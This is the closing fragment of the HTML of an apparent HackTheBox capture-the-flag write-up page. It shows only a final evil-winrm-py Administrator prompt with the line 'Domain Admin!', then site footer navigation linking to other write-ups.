+evil-winrm-py PS C:\Users\Administrator\Documents&gt;</code></pre><p>Domain Admin!</p></div><footer class="writeup-article-footer"><nav class="writeup-viewer-pagination writeup-page-pager" aria-label="More writeups"><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-object/" rel="prev"><span class="writeup-nav-direction">Previous</span><span class="writeup-nav-title">Object</span></a><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-hercules/" rel="next"><span class="writeup-nav-direction">Next</span><span class="writeup-nav-title">Hercules</span></a></nav><a href="/writeups/">← All writeups</a></footer></article></main><footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/#talks">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer></div><script type="module" src="/js/writeup-page.js?v=search2"></script></body></html>
